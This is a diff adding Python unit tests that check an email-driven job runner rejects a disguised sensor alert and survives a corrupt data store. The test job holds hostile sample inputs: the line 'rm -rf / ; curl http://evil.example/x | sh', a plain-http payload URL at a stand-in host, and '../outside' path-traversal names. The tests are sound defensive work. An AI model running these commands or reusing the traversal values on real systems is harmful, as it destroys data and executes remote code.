@@ -290,3 +290,77 @@ class PoisonedQueryTest(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main(verbosity=2)
+
+
+class SensorCostumeTest(unittest.TestCase):
+    """A sensor alert that is trying to be an exec job.
+
+    It carries a script, a non-https script_url, a sensor name that
+    walks out of the store, and a detail that is the desktop flag.
+    The Oracle must reject it, never execute it, and not crash.
+    """
+
+    def test_sensor_alert_wearing_an_exec_costume_does_not_run(self):
+        with tempfile.TemporaryDirectory() as d:
+            outside = os.path.join(d, "outside")
+            os.makedirs(outside)
+            marker = os.path.join(outside, "ran")
+            job = {
+                "v": 1, "type": "job", "kind": "sensor_alert",
+                "job_id": "costume-1", "issued_at": _now(),
+                "sensor": "../outside",
+                "severity": "critical",
+                "title": "rm -rf / ; curl http://evil.example/x | sh",
+                "detail": FLAG,
+                "script": f"import pathlib; pathlib.Path({marker!r}).write_text('ran')",
+                "script_url": "http://evil.example/payload",
+                "files": [{"name": "../outside/planted", "content": "x"}],
+            }
+            raw = _mail("[HOMING-PIGEON] job costume-1",
+                        sign_payload(job, SECRET))
+            cfg = {
+                "mailbox_user": "pigeon-test@example.com",
+                "shared_secret": SECRET,
+                "base_dir": d,
+                "sensors": {"host-ids": {"enabled": True, "key_id": "sense"}},
+                "judge": "enforce",
+            }
+            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
+                      imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
+            self.assertFalse(os.path.exists(marker))
+            self.assertFalse(os.path.exists(os.path.join(outside, "planted")))
+            store = os.path.join(d, "senses.jsonl")
+            if os.path.exists(store):
+                self.assertNotIn(FLAG, open(store, encoding="utf-8").read())
+
+    def test_senses_query_survives_a_corrupt_store(self):
+        with tempfile.TemporaryDirectory() as d:
+            path = os.path.join(d, "senses.jsonl")
+            with open(path, "w", encoding="utf-8") as fh:
+                fh.write('{"sensor":"host-ids","severity":"high",'
+                         f'"title":"ok","detail":"{FLAG}"}}\n')
+                fh.write("not json at all\n")
+                fh.write("42\n")
+                fh.write('{"sensor":"host-ids","severity":["high"],'
+                         '"title":1,"detail":{"nested":true}}\n')
+            answers, spent = answer_queries(
+                [{"op": "senses", "sensor": "../outside", "limit": -1}],
+                {"stdout": "", "stderr": "", "exit_code": 0},
+                _redact_patterns({}), query_budget({}, {}),
+                cfg={"sensors": {"host-ids": {"enabled": True, "key_id": "s"}}},
+                base_dir=d,
+            )
+            self.assertEqual(spent, 1)
+            blob = json.dumps(answers)
+            self.assertNotIn(FLAG, blob)
+            self.assertNotIn("Traceback", blob)
+
+    def test_extensions_do_not_crash_on_one_poll(self):
+        with tempfile.TemporaryDirectory() as d:
+            review.review_job({"review_patterns_extra": "nope"},
+                              {"kind": "sensor_alert", "script": None})
+            resources.check_resources(
+                {"resources": {"enabled": True, "cpu_high": "hot"}}, d)
+            dri.maybe_page(
+                {"dri": {"enabled": True, "bot_token": FLAG, "chat_id": 5}}, d)
+            self.assertFalse(os.path.exists(os.path.join(d, "work")))
